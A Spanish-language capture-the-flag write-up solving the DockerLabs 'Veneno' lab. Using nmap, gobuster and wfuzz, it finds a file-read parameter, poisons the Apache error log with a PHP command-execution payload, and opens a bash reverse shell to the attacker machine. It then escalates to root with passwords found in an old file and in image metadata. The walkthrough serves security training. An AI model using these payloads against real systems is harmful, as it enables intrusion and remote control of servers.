---
title: DockerLabs - Veneno
summary: "Write-up del laboratorio Veneno de DockerLabs"
author: elcybercurioso
date: 2025-11-25
categories: [Post, DockerLabs]
tags: [medio, lfi, log poisoning, credentials leaking, steghide]
media_subpath: "/assets/img/posts/dockerlabs_veneno"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ nmap -sCV -p22,80 172.17.0.2                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:9c:7b:99:95:b6:e8:03:5a:6a:d4:69:69:4a:8d:35 (ECDSA)
|_  256 ec:ec:90:44:4e:66:64:22:f6:8b:cd:29:d2:b5:60:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

## análisis

Comenzamos a revisar los recursos disponibles en el servidor web empleando **gobuster**:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/problems.php         (Status: 200) [Size: 10671]
/index.html           (Status: 200) [Size: 10671]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

## acceso inicial (www-data)

Tras revisar algunas posibilidades, probamos a ver si el recurso `problems.php` tiene alguna funcionalidad oculta (como permitir leer ficheros al pasarle un cierto parámetro que desconocemos), por lo que tratamos de encontrar algún parámetro por fuerza bruta empleando **gobuster**, el cual, tras un rato, nos revela que el parámetro `backdoor` permite leer ficheros del sistema:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ wfuzz -c --hw=961 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/problems.php?FUZZ=../../../../../../../etc/passwd"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/problems.php?FUZZ=../../../../../../../etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                          
=====================================================================

000007815:   200        25 L     32 W       1245 Ch     "backdoor"
```

Probamos a leer el contenido del fichero `/etc/passwd`, y vemos que lo podemos leer sin problema:

![Desktop View](/20251117153626.webp){: width="972" height="589" .shadow}

Tratamos de obtener otros ficheros existentes en el sistema por fuerza bruta empleando diccionarios que sirvan para dicho propósito:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ wfuzz -c --hw=0 -t 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/problems.php?backdoor=FUZZ"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/problems.php?backdoor=../../../../../../../FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                          
=====================================================================

...
000000652:   200        282805 L   5326689 W    43326021 Ch   "/var/log/apache2/error.log"                                                                                                                                              
...
```

Encontramos que el fichero log `/var/log/apache2/error.log` existe, el cual se encarga de almacenar los errores que ocurren en el servidor web (como por ejemplo, al acceder a una ruta inexistente):

![Desktop View](/20251117161019.webp){: width="972" height="589" .shadow}

Probamos a ver si es verdad que se actualiza con lo que indiquemos:

![Desktop View](/20251117175813.webp){: width="600" height="420" .shadow}

Y vemos que efectivamente se está reflejando lo que estamos indicando:

![Desktop View](/20251117175754.webp){: width="972" height="589" .shadow}

Por ello, podemos llegar a la conclusión de que estamos ante la vulnerabilidad de **Log Poisoning** (permite ejecutar comandos cuando un fichero log se puede consultar desde un navegador, ya que lo que indicamos en la URL se muestra y se interpreta a la hora de cargar la página):

```bash
http://172.17.0.2/%3c%3fphp%20system('whoami');%20%3f%3e.php
```

Si volvemos a acceder al fichero log, podemos confirmar la vulnerabilidad:

![Desktop View](/20251117175650.webp){: width="972" height="589" .shadow}

Teniendo esto claro, procedemos construir un payload que, al acceder al log e indicar un parámetro en la URL, podamos ejecutar cualquier comando:

```bash
http://172.17.0.2/%3c%3fphp%20system($_GET['cmd']);%20%3f%3e.php
```

De esta manera, lo que indiquemos en el parámetro `cmd` se interpretará a la hora de cargar la página:

```bash
view-source:http://172.17.0.2/problems.php?backdoor=../../../../../../../var/log/apache2/error.log&cmd=id
```

En el fichero log veremos el resultado:

![Desktop View](/20251117180658.webp){: width="972" height="589" .shadow}

Emplearemos un payload básico para obtener una consola en la máquina (para no tener que codificar en formato URL, he capturado la petición con **Burp Suite**, la he mandado al **Repeater** y he indicado ahí el payload):

![Desktop View](/20251117181115.webp){: width="972" height="589" .shadow}

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
```

Las etiquetas `@urlencode` forman parte del repertorio de funcionalidades que ofrece la extensión `Hackvertor` de **Burp Suite**, las cuales permiten codificar la cadena indicada entre la de apertura y la de cierre a la hora de enviar una petición:

```bash
/problems.php?backdoor=../../../../../../../var/log/apache2/error.log&cmd=<@urlencode>bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"</@urlencode>
```

Se instala desde el menú de extensiones `BApp Store`:

![Desktop View](/20251117181738.webp){: width="972" height="589" .shadow}

Si nos hemos puesto en escucha antes de lanzar la petición, deberíamos haber recibido la consola correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39380
www-data@026a599e9e21:/var/www/html$ whoami
whoami
www-data
www-data@026a599e9e21:/var/www/html$ hostname -I
hostname -I
172.17.0.2
```

Procedemos a tratar la TTY para poder operar con más facilidad:

```bash
www-data@026a599e9e21:/var/www/html$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@026a599e9e21:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ stty raw -echo;fg         
[1]  + continued  nc -nlvp 4444
                               reset xterm
www-data@026a599e9e21:/var/www/html$ export TERM=xterm
www-data@026a599e9e21:/var/www/html$ export SHELL=bash
www-data@026a599e9e21:/var/www/html$ stty rows 49 columns 210
```

## movimiento lateral (carlos)

Comprobamos cuales son los usuarios a los cuales podemos apuntar a la hora de tratar de movernos lateralmente o escalar privilegios:

```bash
www-data@026a599e9e21:/home$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

Tras revisar algunos puntos, encontramos un fichero `.txt` cuyo propietario es el usuario `root`:

```bash
www-data@026a599e9e21:/home$ find / -user root -readable 2>/dev/null | grep -vE "/proc|/dev|/usr|/sys|/etc"
...
/var/www/html/antiguo_y_fuerte.txt
...
```

El contenido nos indica que hay un fichero cuya fecha de creación es superior a 24 años:

```bash
www-data@026a599e9e21:/home$ cat /var/www/html/antiguo_y_fuerte.txt
Es imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala 

soy el unico user del sistema.
```

Por lo que buscando por ficheros cuya fecha fecha de creación sea superior a 24 años (siendo `+8760` los días, 24 años por 365 días por año):

```bash
www-data@026a599e9e21:/home$ find / -type f -mtime +8760 2>/dev/null
/usr/share/viejuno/inhackeable_pass.txt
www-data@026a599e9e21:/home$ ls -la /usr/share/viejuno/inhackeable_pass.txt
-rw-r--r-- 1 root root 20 Jun 28  1999 /usr/share/viejuno/inhackeable_pass.txt
```

El contenido del fichero que hemos encontrado vemos que podría tratarse de una contraseña:

```bash
www-data@026a599e9e21:/home$ cat /usr/share/viejuno/inhackeable_pass.txt
p******************
```

Probamos a ver si se trata de la contraseña del usuario `carlos`, y vemos que es así:

```bash
www-data@026a599e9e21:/home$ su carlos
Password: 
carlos@026a599e9e21:/home$ whoami
carlos
```

## escalada de privilegios (root)

Dentro del directorio personal del usuario `carlos`, encontramos un gran número de carpetas:

```bash
carlos@026a599e9e21:/home$ cd /home/carlos/
carlos@026a599e9e21:~$ ls -la
total 420
drwxr-x--- 1 carlos carlos 4096 Jun 29  2024 .
drwxr-xr-x 1 root   root   4096 Jun 29  2024 ..
-rw-r--r-- 1 carlos carlos  220 Jun 29  2024 .bash_logout
-rw-r--r-- 1 carlos carlos 3771 Jun 29  2024 .bashrc
-rw-r--r-- 1 carlos carlos  807 Jun 29  2024 .profile
drwxr-xr-x 2 root   root   4096 Jun 29  2024 carpeta1
drwxr-xr-x 2 root   root   4096 Jun 29  2024 carpeta10
...
drwxr-xr-x 2 root   root   4096 Jun 29  2024 carpeta98
drwxr-xr-x 2 root   root   4096 Jun 29  2024 carpeta99
```

Para no tener que buscar carpeta a carpeta, lo que podemos hacer es buscar recursivamente en todas las carpetas cual de ellas contiene algún fichero cuyo tamaño sea superior a 0 bytes (`-size +0`):

```bash
carlos@026a599e9e21:~$ find . -type f -size +0
./.profile
./.bash_logout
./.bashrc
./carpeta55/.toor.jpg
```

Encontramos el fichero `./carpeta55/.toor.jpg`, el cual enviamos a nuestra máquina para un análisis más en profundidad:

```bash
carlos@026a599e9e21:~$ cp ./carpeta55/.toor.jpg .
carlos@026a599e9e21:~$ ls -la
total 1040
drwxr-x--- 1 carlos carlos   4096 XXX XX XX:XX .
drwxr-xr-x 1 root   root     4096 Jun 29  2024 ..
-rw-r--r-- 1 carlos carlos    220 Jun 29  2024 .bash_logout
-rw-r--r-- 1 carlos carlos   3771 Jun 29  2024 .bashrc
-rw-r--r-- 1 carlos carlos    807 Jun 29  2024 .profile
-rw-r--r-- 1 carlos carlos 627985 XXX XX XX:XX .toor.jpg
...
carlos@026a599e9e21:~$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

Una vez transferido, lo abrimos y vemos que es la imagen de un pingüino:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ wget http://172.17.0.2:4444/.toor.jpg
Connecting to 172.17.0.2:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 627985 (613K) [image/jpeg]
Saving to: ‘.toor.jpg’

.toor.jpg                                            100%[====================================================================================================================>] 613.27K  --.-KB/s    in 0.002s  

2025-XX-XX XX:XX:XX (282 MB/s) - ‘.toor.jpg’ saved [627985/627985]
 
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ xdg-open .toor.jpg
```

![Desktop View](/20251117190100.webp){: width="600" height="420" .shadow}

Revisamos los metadatos de la imagen, y vemos que en el campo `Image Quality` hay un texto que desentona con los demás datos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Veneno]
└─$ exiftool .toor.jpg 
ExifTool Version Number         : 13.25
File Name                       : .toor.jpg
Directory                       : .
File Size                       : 628 kB
File Modification Date/Time     : 2025:XX:XX XX:XX:XX+XX:XX
File Access Date/Time           : 2025:XX:XX XX:XX:XX+XX:XX
File Inode Change Date/Time     : 2025:XX:XX XX:XX:XX+XX:XX
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Quality                   : p*********
Image Width                     : 2048
Image Height                    : 2048
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2048x2048
Megapixels                      : 4.2
```

Probamos a ver si dicha cadena es la contraseña del usuario `root` de la máquina, y vemos que es así:

```bash
carlos@026a599e9e21:~$ su root
Password: 
root@026a599e9e21:/home/carlos# whoami
root
```

De esta forma, habremos completado la máquina Veneno!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>